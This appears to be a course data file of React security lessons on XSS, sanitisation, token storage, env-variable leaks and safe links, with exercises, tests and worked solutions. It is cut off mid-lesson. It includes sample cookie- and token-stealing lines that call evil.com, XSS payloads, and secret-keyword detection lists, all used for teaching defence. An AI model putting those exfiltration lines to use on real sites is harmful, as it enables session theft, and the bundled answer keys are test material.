// Phase 12: Security and Production Readiness
export const phase12 = {
  id: 'phase-12',
  title: 'Phase 12 — Security and Production Readiness',
  description: 'Master enterprise-grade React security and deployment hygiene: JSX auto-escaping vs XSS attack vectors, DOMPurify sanitization with dangerouslySetInnerHTML, javascript: URL injection, rel="noopener noreferrer", HTTP-only cookies vs localStorage token theft, CORS & CSRF defense, Vite VITE_ environment variable security, Content Security Policy (CSP), production build optimization, and error telemetry.',
  icon: 'Shield',
  badge: 'Security',
  estimatedHours: 14,
  lessons: [
    {
      id: 'p12-l1',
      slug: 'xss-prevention-jsx-escaping',
      title: 'XSS Prevention: How JSX Escapes Content by Default',
      prerequisites: ['p1-l2'],
      estimatedDuration: '25 mins',
      difficulty: 'Beginner',
      objectives: [
        'Understand Cross-Site Scripting (XSS) attacks in single-page apps.',
        'Learn how React automatically escapes strings embedded in JSX.',
        'Identify vectors where React\'s automatic escaping does NOT protect you.'
      ],
      explanation: 'Cross-Site Scripting (XSS) occurs when an attacker injects malicious client-side JavaScript into a web page viewed by other users (e.g. stealing session cookies or redirecting users to phishing sites).\n\nBy default, **React automatically escapes all values rendered inside JSX `{}` curly braces**. If a user enters `<script>alert(\'hacked\')</script>` or `<img src=x onerror=alert(1)>`, React converts special characters into safe escaped strings (`&lt;script&gt;`), rendering them as literal visible text in the DOM rather than executable HTML.\n\nHowever, React\\\'s auto-escaping does NOT protect against: \n1. `dangerouslySetInnerHTML`\n2. User-controlled URLs in `<a href={userUrl}>`\n3. User-controlled image sources in `<img src={userUrl}>`.',
      whyItExists: 'Protects billions of web users from malicious script injection by making the default rendering mode 100% safe.',
      syntaxRules: 'Rendering `{userInput}` in JSX is safe. Unsafe: `href={userInput}` without validation or `dangerouslySetInnerHTML`.',
      codeExample: `export function CommentView({ commentText, userWebsite }) {
  // Safe: React converts '<script>' to literal string '&lt;script&gt;'
  return (
    <div className="comment">
      <p>{commentText}</p>

      {/* DANGER! React auto-escaping does NOT prevent 'javascript:alert(1)' in href! */}
      <a href={userWebsite}>Visit Author Website</a>
    </div>
  );
}`,
      lineByLine: [
        'Line 5: {commentText} is automatically escaped by React. Script tags will not execute.',
        'Line 8: <a href={userWebsite}> is an XSS vulnerability if userWebsite starts with "javascript:".'
      ],
      expectedBehavior: 'Harmful HTML injected into `{commentText}` renders safely as text on the screen without execution.',
      commonMistakes: [
        'Assuming React protects against ALL XSS attacks (it does not protect against malicious URL attributes like `javascript:stealToken()`).',
        'Concatenating raw HTML strings before passing them to the DOM.'
      ],
      practiceLevels: {
        levelA: 'Verify that rendering `<img onerror=...>` via JSX does not trigger image error execution.',
        levelB: 'Implement a URL sanitizer rejecting "javascript:" or "data:" protocols.',
        levelC: 'Audit an existing component for unsafe attribute bindings.'
      },
      debuggingChallenge: {
        brokenCode: `function UserLink({ profileUrl }) {\n  return <a href={profileUrl}>Profile</a>;\n}\n// Attacker inputs: profileUrl = "javascript:fetch('https://evil.com?c='+document.cookie)"`,
        problem: 'Clicking the link executes arbitrary JavaScript with full access to user cookies and session data.',
        fix: 'Validate that the URL starts with `https://` or `http://` before rendering the `href`.'
      },
      conceptualQuestion: {
        question: 'Under which of the following circumstances does React\'s automatic JSX escaping FAIL to prevent XSS?',
        options: [
          'When rendering plain strings inside a `<p>` tag.',
          'When passing unvalidated user input into `<a href={userInput}>` or using `dangerouslySetInnerHTML`.',
          'When using TypeScript.',
          'When rendering numbers inside a `<span>` tag.'
        ],
        correctIndex: 1,
        explanation: 'React escapes text content inside tags, but it does NOT validate URL protocols in `href` or prevent HTML injection when using `dangerouslySetInnerHTML`.'
      },
      codeReadingQuestion: {
        snippet: `const input = "<b onmouseover=alert(1)>Click</b>";\nreturn <div>{input}</div>;`,
        question: 'Will the `onmouseover` event execute when the user hovers over the text?',
        answer: 'No. React renders the raw string "<b onmouseover=alert(1)>Click</b>" as plain visible text.'
      },
      starterCode: `// Assignment: Implement sanitizeExternalUrl
// Build a secure URL sanitizer for React href attributes:
// sanitizeExternalUrl(url, fallback = '#')
// Rules:
// - Must start with 'https://' or 'http://' (case-insensitive)
// - Must not contain whitespace
// - Must not start with 'javascript:', 'data:', 'vbscript:'
// Returns the sanitized URL or fallback.

export function sanitizeExternalUrl(url, fallback = '#') {
  // Your code here
}`,
      testCases: [
        {
          name: 'Allows valid https URLs',
          run: (fn) => {
            const valid = 'https://example.com/profile?id=123';
            return fn(valid) === valid;
          }
        },
        {
          name: 'Blocks javascript: and data: pseudo-protocols',
          run: (fn) => {
            const attack1 = 'javascript:alert(document.cookie)';
            const attack2 = 'data:text/html,<script>alert(1)</script>';
            return fn(attack1) === '#' && fn(attack2) === '#';
          }
        },
        {
          name: 'Blocks URLs with leading spaces attempting bypass',
          run: (fn) => {
            return fn('  javascript:alert(1)') === '#';
          }
        }
      ],
      solution: `export function sanitizeExternalUrl(url, fallback = '#') {
  if (typeof url !== 'string') return fallback;
  const trimmed = url.trim();
  const lower = trimmed.toLowerCase();

  if (lower.startsWith('javascript:') || lower.startsWith('data:') || lower.startsWith('vbscript:')) {
    return fallback;
  }
  if (!lower.startsWith('http://') && !lower.startsWith('https://')) {
    return fallback;
  }
  if (/\\s/.test(trimmed)) {
    return fallback;
  }
  return trimmed;
}`,
      hints: [
        'Trim whitespace and convert to lowercase for protocol check.',
        'Reject javascript:, data:, or vbscript:.',
        'Verify that string starts with http:// or https://.'
      ]
    },
    {
      id: 'p12-l2',
      slug: 'dangerouslysetinnerhtml-dompurify',
      title: 'Safely Handling Rich Text: dangerouslySetInnerHTML & DOMPurify',
      prerequisites: ['p12-l1'],
      estimatedDuration: '30 mins',
      difficulty: 'Intermediate',
      objectives: [
        'Understand why React deliberately named the prop `dangerouslySetInnerHTML`.',
        'Sanitize rich HTML strings using DOMPurify before rendering.',
        'Configure DOMPurify allowlists for tags and attributes.'
      ],
      explanation: 'When rendering CMS content, blog articles, or markdown previews, you need to render actual HTML markup (`<b>`, `<h2>`, `<p>`). React names this prop `dangerouslySetInnerHTML` as an intentional reminder that passing unvalidated HTML allows attackers to execute XSS scripts.\n\nTo safely render rich text, you must sanitize the HTML using a trusted library like **DOMPurify**. DOMPurify parses the HTML, strips out malicious `<script>`, `onerror=`, `onload=`, and invalid tags, leaving only safe formatting tags.',
      whyItExists: 'Enables rendering rich HTML formatting while completely stripping dangerous executable vectors.',
      syntaxRules: '`import DOMPurify from "dompurify";`\n`<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(dirtyHtml) }} />`.',
      codeExample: `import React from 'react';
// import DOMPurify from 'dompurify'; // Production standard

export function ArticleBody({ rawHtmlContent }: { rawHtmlContent: string }) {
  // Simulate DOMPurify sanitization
  // In real project: const cleanHtml = DOMPurify.sanitize(rawHtmlContent);
  const cleanHtml = rawHtmlContent
    .replace(/<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/gi, '')
    .replace(/on\\w+="[^"]*"/gi, '');

  return (
    <article className="prose">
      {/* Passing object with __html property */}
      <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />
    </article>
  );
}`,
      lineByLine: [
        'Line 7: Sanitization strips harmful script tags and inline event handlers.',
        'Line 14: dangerouslySetInnerHTML={{ __html: ... }} instructs React to inject raw markup.'
      ],
      expectedBehavior: 'Article displays bold, italics, and headers, but malicious script tags or onmouseover handlers are eliminated.',
      commonMistakes: [
        'Passing unsanitized user-generated content directly into `dangerouslySetInnerHTML`.',
        'Writing your own naive regex to sanitize HTML (attackers easily bypass regex with obfuscated encodings; always use DOMPurify in production!).'
      ],
      practiceLevels: {
        levelA: 'Sanitize a blog comment allowing only `<b>`, `<i>`, and `<a>` tags.',
        levelB: 'Configure DOMPurify with `ALLOWED_TAGS` and `ALLOWED_ATTR`.',
        levelC: 'Test that SVG image payloads `<svg onload=...>` are stripped.'
      },
      debuggingChallenge: {
        brokenCode: `<div dangerouslySetInnerHTML={cleanHtml} /> // React error: Value must be an object with an __html property!`,
        problem: 'dangerouslySetInnerHTML expects an object with `{ __html: string }`, not a raw string.',
        fix: 'Pass `dangerouslySetInnerHTML={{ __html: cleanHtml }}`.'
      },
      conceptualQuestion: {
        question: 'Why did the React team name the prop `dangerouslySetInnerHTML` instead of simply `innerHTML`?',
        options: [
          'Because innerHTML is a copyrighted browser API name.',
          'To intentionally force developers and code reviewers to pause, recognize the security risk, and ensure the content has been properly sanitized.',
          'Because it reduces JavaScript compilation speed.',
          'It is a joke from early Facebook engineers.'
        ],
        correctIndex: 1,
        explanation: 'The deliberate naming reminds developers that injecting unescaped HTML exposes the app to Cross-Site Scripting (XSS) vulnerabilities.'
      },
      codeReadingQuestion: {
        snippet: `DOMPurify.sanitize('<img src="x" onerror="alert(1)">', { ALLOWED_TAGS: ['b'] });`,
        question: 'What is the sanitized output of this call?',
        answer: 'Empty string `""`, because `<img>` is not in the `ALLOWED_TAGS` list.'
      },
      starterCode: `// Assignment: Implement sanitizeHtmlAllowlist
// Build a lightweight HTML sanitizer simulator:
// sanitizeHtmlAllowlist(dirtyHtml, allowedTags = ['b', 'i', 'p', 'em', 'strong'])
// Strips all tags not in allowedTags.
// Strips all 'on*' event attributes (e.g. onclick, onerror).
// Strips '<script>...</script>' blocks entirely.

export function sanitizeHtmlAllowlist(dirtyHtml, allowedTags = ['b', 'i', 'p', 'em', 'strong']) {
  // Your code here
}`,
      testCases: [
        {
          name: 'Preserves allowed formatting tags and strips disallowed tags',
          run: (fn) => {
            const dirty = '<p>Hello <b>World</b> and <iframe src="evil.com"></iframe></p>';
            const res = fn(dirty, ['p', 'b']);
            return res.includes('<p>') && res.includes('<b>World</b>') && !res.includes('<iframe');
          }
        },
        {
          name: 'Strips malicious script tags and inline event handlers',
          run: (fn) => {
            const dirty = '<b onclick="steal()">Click</b><script>alert(1)</script>';
            const res = fn(dirty, ['b']);
            return res === '<b>Click</b>' && !res.includes('onclick') && !res.includes('script');
          }
        }
      ],
      solution: `export function sanitizeHtmlAllowlist(dirtyHtml, allowedTags = ['b', 'i', 'p', 'em', 'strong']) {
  if (typeof dirtyHtml !== 'string') return '';
  // 1. Remove script tags and content
  let cleaned = dirtyHtml.replace(/<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/gi, '');
  // 2. Remove inline event handlers (e.g. onclick="...", onerror='...')
  cleaned = cleaned.replace(/\\s*on\\w+\\s*=\\s*["'][^"']*["']/gi, '');
  // 3. Strip tags not in allowed list
  cleaned = cleaned.replace(/<\\/?([a-z0-9]+)[^>]*>/gi, (match, tag) => {
    return allowedTags.includes(tag.toLowerCase()) ? \`<\${match.startsWith('</') ? '/' : ''}\${tag.toLowerCase()}>\` : '';
  });
  return cleaned;
}`,
      hints: [
        'Strip script blocks with regex replace.',
        'Strip on[a-z]+= attributes.',
        'Inspect matched tag names and check if allowedTags.includes(tag.toLowerCase()).'
      ]
    },
    {
      id: 'p12-l3',
      slug: 'token-storage-httponly-vs-localstorage',
      title: 'Authentication Storage: HTTP-Only Cookies vs localStorage',
      prerequisites: ['p6-l1', 'p12-l1'],
      estimatedDuration: '30 mins',
      difficulty: 'Intermediate',
      objectives: [
        'Understand the risks of storing JWTs in `localStorage` or `sessionStorage`.',
        'Learn why HTTP-Only SameSite cookies are the industry standard for auth tokens.',
        'Implement automatic credential transmission with `credentials: "include" / withCredentials: true`.'
      ],
      explanation: 'A pervasive mistake among beginner MERN developers is storing JWT access tokens in `localStorage` (`localStorage.setItem("token", jwt)`). \n\n**The Vulnerability**: JavaScript has full access to `localStorage`. If your application has a single XSS vulnerability (e.g. in a third-party npm package or unsanitized comment), the attacker can execute `fetch("https://evil.com?t=" + localStorage.getItem("token"))` and instantly hijack the user\'s account permanently.\n\n**The Solution**: Store auth tokens in **HTTP-Only cookies** (`Set-Cookie: token=...; HttpOnly; Secure; SameSite=Strict`). The browser manages and attaches the cookie automatically with every request, but JavaScript `document.cookie` is strictly forbidden from reading it, rendering token theft impossible via XSS.',
      whyItExists: 'Protects user accounts and session keys from being stolen by injected client-side scripts.',
      syntaxRules: 'Backend sets `HttpOnly; Secure; SameSite=Lax`. React frontend passes `{ credentials: "include" }` in fetch calls.',
      codeExample: `// Frontend API call with HTTP-Only cookie support:
export async function fetchProtectedProfile() {
  // Notice: NO manual Authorization: Bearer token header needed!
  // The browser automatically attaches the HttpOnly cookie for you!
  const response = await fetch('/api/user/profile', {
    method: 'GET',
    credentials: 'include', // <--- Crucial: tells browser to send cross-origin cookies
    headers: {
      'Content-Type': 'application/json'
    }
  });

  if (!response.ok) {
    if (response.status === 401) {
      window.location.href = '/login';
    }
    throw new Error('Unauthorized');
  }

  return response.json();
}`,
      lineByLine: [
        'Line 6: credentials: "include" ensures the browser attaches cookies with the request.',
        'Line 11: If session expired or cookie missing, server returns 401.'
      ],
      expectedBehavior: 'Tokens are never exposed in JavaScript memory or web storage.',
      commonMistakes: [
        'Writing `localStorage.setItem("jwt", token)` in production financial or healthcare apps.',
        'Forgetting `credentials: "include"` in fetch (or `withCredentials: true` in axios), causing cookies not to be sent with cross-origin requests.'
      ],
      practiceLevels: {
        levelA: 'Configure a fetch wrapper with credentials: "include".',
        levelB: 'Compare security trade-offs of in-memory access tokens with HttpOnly refresh tokens.',
        levelC: 'Test CSRF token synchronization headers.'
      },
      debuggingChallenge: {
        brokenCode: `// Backend set HttpOnly cookie, but user profile fetch always returns 401 Unauthorized!\nfetch('https://api.mycorp.com/profile')`,
        problem: 'By default, cross-origin fetch does not attach cookies unless `credentials: "include"` is explicitly passed.',
        fix: 'Add `{ credentials: "include" }` to fetch options.'
      },
      conceptualQuestion: {
        question: 'Why does storing a JWT in an HTTP-Only cookie protect against XSS token theft?',
        options: [
          'Because HTTP-Only cookies are encrypted with quantum algorithms.',
          'The browser prevents client-side JavaScript (`document.cookie`) from reading the cookie, so injected scripts cannot steal the token.',
          'HTTP-Only cookies delete themselves after 5 seconds.',
          'Cookies can only be used on HTTPS.'
        ],
        correctIndex: 1,
        explanation: 'The `HttpOnly` flag instructs the browser that JavaScript has zero access to the cookie. Injected XSS payloads cannot read or transmit it.'
      },
      codeReadingQuestion: {
        snippet: `Set-Cookie: sessionId=xyz123; HttpOnly; Secure; SameSite=Strict`,
        question: 'What does the `SameSite=Strict` flag prevent?',
        answer: 'It prevents Cross-Site Request Forgery (CSRF) by ensuring the browser never sends the cookie on cross-site requests or navigation from external sites.'
      },
      starterCode: `// Assignment: Implement auditStorageSecurity
// Build a security auditor for stored client-side keys:
// auditStorageSecurity(storageDump)
// - storageDump: object of { [key]: valueString }
// Flags insecure storage if key name or value looks like sensitive auth data:
// - Flag if key contains: 'token', 'jwt', 'secret', 'password', 'auth'
// - Flag if value matches JWT pattern: 3 base64 strings separated by dots
// Returns: { isSecure: boolean, flaggedKeys: string[], recommendations: string[] }

export function auditStorageSecurity(storageDump) {
  // Your code here
}`,
      testCases: [
        {
          name: 'Flags stored auth tokens and JWTs',
          run: (fn) => {
            const dump = {
              theme: 'dark',
              user_token: 'abc.def.ghi',
              auth_secret: '123'
            };
            const res = fn(dump);
            return res.isSecure === false && res.flaggedKeys.length === 2 && res.recommendations.length > 0;
          }
        },
        {
          name: 'Passes clean UI preference storage',
          run: (fn) => {
            const dump = { theme: 'light', sidebar_open: 'true', lang: 'en' };
            const res = fn(dump);
            return res.isSecure === true && res.flaggedKeys.length === 0;
          }
        }
      ],
      solution: `export function auditStorageSecurity(storageDump) {
  const sensitivePatterns = ['token', 'jwt', 'secret', 'password', 'auth'];
  const jwtRegex = /^[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+$/;
  const flagged = [];

  for (const [key, val] of Object.entries(storageDump)) {
    const lowerKey = key.toLowerCase();
    const isSensitiveKey = sensitivePatterns.some(p => lowerKey.includes(p));
    const isJwtValue = typeof val === 'string' && jwtRegex.test(val);

    if (isSensitiveKey || isJwtValue) {
      flagged.push(key);
    }
  }

  const isSecure = flagged.length === 0;
  const recommendations = isSecure
    ? []
    : ['Move authentication tokens to HttpOnly, Secure, SameSite cookies to protect against XSS token theft.'];

  return {
    isSecure,
    flaggedKeys: flagged,
    recommendations
  };
}`,
      hints: [
        'Check sensitive patterns against key names.',
        'Test values against 3-segment JWT regex.',
        'Populate flaggedKeys and return isSecure: flagged.length === 0.'
      ]
    },
    {
      id: 'p12-l4',
      slug: 'vite-env-variables-security',
      title: 'Environment Variables in Vite: What is Public vs Secret',
      prerequisites: ['p1-l1'],
      estimatedDuration: '25 mins',
      difficulty: 'Beginner',
      objectives: [
        'Understand Vite\'s `VITE_` prefix convention.',
        'Recognize that ALL frontend environment variables are publicly visible in client bundles.',
        'Never store private database passwords, Stripe secret keys, or AWS keys in a React frontend.'
      ],
      explanation: 'In Vite, only environment variables prefixed with `VITE_` (e.g. `VITE_API_URL`) are exposed to your React code via `import.meta.env.VITE_API_URL`.\n\n**CRITICAL RULE**: A React Single Page Application runs 100% inside the user\'s web browser. Therefore, **ANY environment variable loaded into React is completely public to anyone who opens DevTools or reads the JS bundle**.\n\nNever put private backend secrets in React `.env` files (e.g. `STRIPE_SECRET_KEY`, `MONGO_URI`, `JWT_SECRET`). Only public identifiers belong in the client (e.g. `VITE_STRIPE_PUBLISHABLE_KEY`, `VITE_API_BASE_URL`).',
      whyItExists: 'Prevents catastrophic leaks of database credentials, payment secret keys, and cloud API master tokens.',
      syntaxRules: 'Use `import.meta.env.VITE_PUBLIC_NAME`. Never put private keys in files checked into git.',
      codeExample: `// .env file
# SAFE FOR FRONTEND: Public API base URL
VITE_API_URL=https://api.myproductionapp.com

# SAFE FOR FRONTEND: Publishable key (intended for public client checkout)
VITE_STRIPE_PUBLISHABLE_KEY=pk_live_123456

# DANGER! DO NOT PUT IN REACT .ENV!
# Anyone can read this in the browser bundle!
# STRIPE_SECRET_KEY=sk_live_secret999 (Keep on Node/Express backend ONLY!)

// Component.jsx
export function CheckoutButton() {
  const apiUrl = import.meta.env.VITE_API_URL;
  return <button onClick={() => fetch(\`\${apiUrl}/create-session\`)}>Checkout</button>;
}`,
      lineByLine: [
        'Line 2-5: VITE_ prefix exposes variables to client bundle.',
        'Line 8: Secret keys must stay exclusively on the Express/Node.js server.',
        'Line 13: import.meta.env reads public client configuration.'
      ],
      expectedBehavior: 'Client bundle contains only public URLs and publishable keys.',
      commonMistakes: [
        'Putting database connection strings in a React frontend `.env` file.',
        'Committing `.env` containing production keys to public GitHub repositories (always add `.env` and `.env.local` to `.gitignore`).'
      ],
      practiceLevels: {
        levelA: 'Configure a .env.development and .env.production file in Vite.',
        levelB: 'Inspect Vite\'s compiled dist bundle to locate where import.meta.env is replaced with raw strings.',
        levelC: 'Configure a pre-commit git hook checking for leaked secret keys.'
      },
      debuggingChallenge: {
        brokenCode: `// In Vite React:
const db = new MongoClient(import.meta.env.VITE_MONGO_URI); // Exposes database credentials to the entire world!`,
        problem: 'Directly connecting to a database from client-side React exposes your database URI and password to every visitor.',
        fix: 'Connect to MongoDB only on the backend (Node/Express). The React frontend communicates with Express via secure API routes.'
      },
      conceptualQuestion: {
        question: 'Can you hide a secret API key in a React client application using Vite environment variables without a backend server?',
        options: [
          'Yes, by encrypting the .env file with a password.',
          'No. All code in a client-side React app is downloaded and executed in the user\'s browser; any bundled variable is visible in browser DevTools.',
          'Yes, if you use TypeScript.',
          'Yes, if you use minification.'
        ],
        correctIndex: 1,
        explanation: 'Client-side bundles run on the user\'s machine. Any key bundled into the app can be inspected and extracted by anyone.'
      },
      codeReadingQuestion: {
        snippet: `// .env\nSECRET_KEY=12345\nVITE_PUBLIC_ID=999\n// In App.jsx: console.log(import.meta.env.SECRET_KEY);`,
        question: 'What does `console.log(import.meta.env.SECRET_KEY)` output in Vite?',
        answer: '`undefined`. Vite intentionally filters out variables that lack the `VITE_` prefix to prevent accidental leakage.'
      },
      starterCode: `// Assignment: Implement envLeakDetector
// Scan an object representing parsed .env variables:
// envLeakDetector(envConfig)
// - envConfig: object of { [key]: valueString }
// Flags high-risk violations:
// - If key name contains 'SECRET', 'PRIVATE', 'PASSWORD', 'DATABASE', 'MONGO', 'KEY'
//   and starts with 'VITE_': Critical leak warning!
// Returns: { hasLeaks: boolean, leakedKeys: string[], message: string }

export function envLeakDetector(envConfig) {
  // Your code here
}`,
      testCases: [
        {
          name: 'Flags critical secret keys exposed via VITE_ prefix',
          run: (fn) => {
            const config = {
              VITE_API_URL: 'https://api.com',
              VITE_STRIPE_SECRET_KEY: 'sk_live_12345',
              VITE_DB_PASSWORD: 'admin_password'
            };
            const res = fn(config);
            return res.hasLeaks === true && res.leakedKeys.length === 2;
          }
        },
        {
          name: 'Approves safe public configurations',
          run: (fn) => {
            const config = {
              VITE_APP_TITLE: 'My App',
              VITE_API_ENDPOINT: '/api/v1'
            };
            const res = fn(config);
            return res.hasLeaks === false && res.leakedKeys.length === 0;
          }
        }
      ],
      solution: `export function envLeakDetector(envConfig) {
  const highRiskKeywords = ['SECRET', 'PRIVATE', 'PASSWORD', 'DATABASE', 'MONGO'];
  const leaked = [];

  for (const key of Object.keys(envConfig)) {
    if (key.startsWith('VITE_')) {
      const rest = key.slice(5).toUpperCase();
      if (highRiskKeywords.some(kw => rest.includes(kw))) {
        leaked.push(key);
      }
    }
  }

  return {
    hasLeaks: leaked.length > 0,
    leakedKeys: leaked,
    message: leaked.length > 0
      ? \`CRITICAL: Found \${leaked.length} secret variable(s) exposed to the client bundle!\`
      : 'All environment variables comply with client safety policies.'
  };
}`,
      hints: [
        'Check if key startsWith("VITE_").',
        'Check if uppercase key contains highRiskKeywords like SECRET, PASSWORD, DATABASE.',
        'Collect leaked keys into leaked array.'
      ]
    },
    {
      id: 'p12-l5',
      slug: 'safe-external-links-noopener',
      title: 'Safe External Links: `rel="noopener noreferrer"`',
      prerequisites: ['p1-l2'],
      estimatedDuration: '20 mins',
      difficulty: 'Beginner',
      objectives: [
        'Understand the "reverse tabnabbing" security vulnerability.',
        'Explain what `window.opener` allows malicious third-party pages to do.',
        'Use `rel="noopener noreferrer"` on all `target="_blank"` anchor tags.'
      ],
      explanation: 'When you open an external link in a new tab using `<a href="https://other.com" target="_blank">`, the newly opened page gains a JavaScript reference to your application\'s tab via `window.opener`.\n\n**Reverse Tabnabbing Attack**: While the user is browsing the external site, malicious JavaScript on that page can execute `window.opener.location = "https://fake-phishing-login.com"`. When the user clicks back to your original tab, they see a fake login screen and re-enter their password!\n\nAdding `rel="noopener noreferrer"` ensures `window.opener` is set to `null` and prevents the HTTP `Referer` header from leaking sensitive internal URLs.',
      whyItExists: 'Blocks reverse tabnabbing phishing attacks and preserves user privacy.',
      syntaxRules: 'Always pair `target="_blank"` with `rel="noopener noreferrer"`. Modern browsers default target="_blank" to noopener, but older browsers and linters still require explicit declaration.',
      codeExample: `// Secure external link component:
interface SafeExternalLinkProps {
  href: string;
  children: React.ReactNode;
  className?: string;
}

export function SafeExternalLink({ href, children, className = '' }: SafeExternalLinkProps) {
  return (
    <a
      href={href}
      target="_blank"
      rel="noopener noreferrer"
      className={\`external-link \${className}\`}
    >
      {children}
      <span className="sr-only">(opens in a new tab)</span>
    </a>
  );
}`,
      lineByLine: [
        'Line 11: target="_blank" opens link in a new browser tab.',
        'Line 12: rel="noopener noreferrer" blocks access to window.opener and strips Referer header.',
        'Line 15: Screen-reader text informs visually impaired users that a new tab will open (WCAG requirement).'
      ],
      expectedBehavior: 'External pages cannot control or redirect the parent tab.',
      commonMistakes: [
        'Adding `target="_blank"` without `rel="noopener noreferrer"`.',
        'Omitting screen-reader notification when opening links in new tabs.'
      ],
      practiceLevels: {
        levelA: 'Build a reusable SafeLink component with icon and a11y label.',
        levelB: 'Configure ESLint rule `react/jsx-no-target-blank`.',
        levelC: 'Verify window.opener behavior in browser DevTools.'
      },
      debuggingChallenge: {
        brokenCode: `<a href="https://external-resource.com" target="_blank">Documentation</a> // ESLint Warning: Using target="_blank" without rel="noopener noreferrer" is a security risk`,
        problem: 'Opens tabnabbing vulnerability and triggers linter warning.',
        fix: 'Add `rel="noopener noreferrer"`.'
      },
      conceptualQuestion: {
        question: 'What is the security risk of opening external links with `target="_blank"` without `rel="noopener"`?',
        options: [
          'The external page can steal the user\'s local hard drive files.',
          'The target page can use `window.opener.location` to redirect your application\'s tab to a phishing clone while the user is looking away (Reverse Tabnabbing).',
          'It crashes the user\'s browser.',
          'It slows down internet connection.'
        ],
        correctIndex: 1,
        explanation: '`window.opener` grants the opened page partial control over the originating window\'s location unless severed with `noopener`.'
      },
      codeReadingQuestion: {
        snippet: `<a href="https://partner.com" target="_blank" rel="noreferrer">Partner</a>`,
        question: 'Does `rel="noreferrer"` also imply `noopener` in modern browsers?',
        answer: 'Yes! `noreferrer` inherently implies `noopener` while also omitting the Referer request header.'
      },
      starterCode: `// Assignment: Implement enforceSafeLinks
// Simulate an anchor tag attribute validator:
// enforceSafeLinks(linkAttributes)
// - linkAttributes: object { href: string, target?: string, rel?: string }
// If target === '_blank':
//   - Ensures 'noopener' and 'noreferrer' are in the rel string (space-separated).
// Returns updated linkAttributes object.

export function enforceSafeLinks(linkAttributes) {
  // Your code here
}`,
      testCases: [
        {
          name: 'Adds noopener noreferrer when target is _blank and rel is missing',
          run: (fn) => {
            const input = { href: 'https://google.com', target: '_blank' };
            const res = fn(input);
            return res.rel.includes('noopener') && res.rel.includes('noreferrer');
          }
        },
        {
          name: 'Leaves internal links without _blank untouched',
          run: (fn) => {
            const input = { href: '/dashboard' };
            const res = fn(input);
            return !res.rel;
          }
        }
      ],
      solution: `export function enforceSafeLinks(linkAttributes) {
  const result = { ...linkAttributes };
  if (result.target === '_blank') {
    const existing = result.rel ? result.rel.split(/\\s+/) : [];
    const set = new Set(existing);
    set.add('noopener');
    set.add('noreferrer');
    result.rel = Array.from(set).join(' ');
  }
  return result;
}`,
      hints: [
        'Clone input: const result = { ...linkAttributes }.',
        'If result.target === "_blank", parse existing rel into a Set.',
        'Add "noopener" and "noreferrer", join with space, and assign to result.rel.'
      ]
    },
    {
      id: 'p12-l6',
      slug: 'production-build-optimization-checklist',
      title: 'Production Build Optimization and Readiness Checklist',
      prerequisites: ['p10-l8', 'p12-l4'],
      estimatedDuration: '30 mins',
      difficulty: 'Intermediate',
      objectives: [
        'Analyze bundle sizes with `rollup-plugin-visualizer`.',
        'Configure Terser/Esbuild to strip `console.log` statements in production.',
        'Execute the 10-point Pre-Launch Production Readiness Checklist.'
      ],
      explanation: 'Deploying a React application to production is more than just running `npm run build`. A production-ready app must have:\n1. **Zero Console Logs**: Stripping `console.log` and `console.debug` statements.\n2. **Clean Bundle Splits**: Ensuring vendor chunks (React, UI libraries) are cached separately from fast-changing application code.\n3. **Source Maps**: Hidden or sent securely to error tracking tools (Sentry) rather than exposed publicly.\n4. **Fallback Error Boundaries**: Ensuring unhandled JavaScript crashes display a friendly error page.\n5. **Gzip / Brotli Compression**: Enabling pre-compressed assets.',
      whyItExists: 'Ensures the deployed application is fast, secure, and observable without exposing debugging data.',
      syntaxRules: 'Run `npm run build` and inspect `dist/`. In `vite.config.js`, configure `esbuild: { drop: ["console", "debugger"] }`.',
      codeExample: `// vite.config.js production optimizations:
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],
  esbuild: {
    // Strip console.log and debugger statements from production builds
    drop: process.env.NODE_ENV === 'production' ? ['console', 'debugger'] : []
  },
  build: {
    target: 'es2020',
    sourcemap: 'hidden', // Generates maps for Sentry error tracking, but doesn't expose in browser
    rollupOptions: {
      output: {
        manualChunks: {
          vendor: ['react', 'react-dom']
        }
      }
    }
  }
});`,
      lineByLine: [
        'Line 8: Automatically drops all console.log calls during production compilation.',
        'Line 12: sourcemap: "hidden" prevents DevTools users from downloading full source code while enabling Sentry stack traces.',
        'Line 15: manualChunks groups core React libraries into a long-lived cacheable chunk.'
      ],
      expectedBehavior: 'Production build generates minimal, highly compressed JavaScript with zero stray logs.',
      commonMistakes: [
        'Leaving verbose `console.log({ userSecret, authToken })` in production code.',
        'Deploying public source maps that expose entire proprietary source code to anyone inspecting the Sources tab in DevTools.'
      ],
      practiceLevels: {
        levelA: 'Configure Vite to drop console statements on build.',
        levelB: 'Run `npx vite-bundle-visualizer` to identify heavy npm dependencies.',
        levelC: 'Configure an Nginx reverse proxy with gzip and HTTP cache headers.'
      },
      debuggingChallenge: {
        brokenCode: `// Production bundle size is 4.8MB! Initial load takes 7 seconds!`,
        problem: 'Importing massive monolithic libraries (like `import _ from "lodash"` or large icon sets) without tree-shaking.',
        fix: 'Use granular imports: `import debounce from "lodash/debounce"` or switch to lightweight modern alternatives like `lucide-react`.'
      },
      conceptualQuestion: {
        question: 'What is the purpose of configuring `manualChunks: { vendor: ["react", "react-dom"] }` in Vite/Rollup?',
        options: [
          'It makes the code run faster on mobile devices.',
          'It separates stable third-party dependencies from frequent application code changes, allowing the browser to cache vendor.js indefinitely across deployments.',
          'It compiles React to WebAssembly.',
          'It enables offline PWA support.'
        ],
        correctIndex: 1,
        explanation: 'Vendor caching ensures users don\'t re-download React every time you deploy a small 1-line bug fix in your app code.'
      },
      codeReadingQuestion: {
        snippet: `// vite.config.js\nbuild: { sourcemap: false }`,
        question: 'What is the trade-off of setting `sourcemap: false`?',
        answer: 'It reduces build size and prevents public source code inspection, but makes debugging production error stack traces much harder because line numbers are minified.'
      },
      starterCode: `// Assignment: Implement productionReadinessCheck
// Verify production deployment checklist:
// productionReadinessCheck(projectConfig)
// - projectConfig: { hasErrorBoundary: boolean, consoleLogsRemoved: boolean, httpsEnabled: boolean, bundleSizeKb: number }
// Rules:
// - All boolean flags must be true
// - bundleSizeKb must be <= 500
// Returns: { ready: boolean, failures: string[] }

export function productionReadinessCheck(config) {
  // Your code here
}`,
      testCases: [
        {
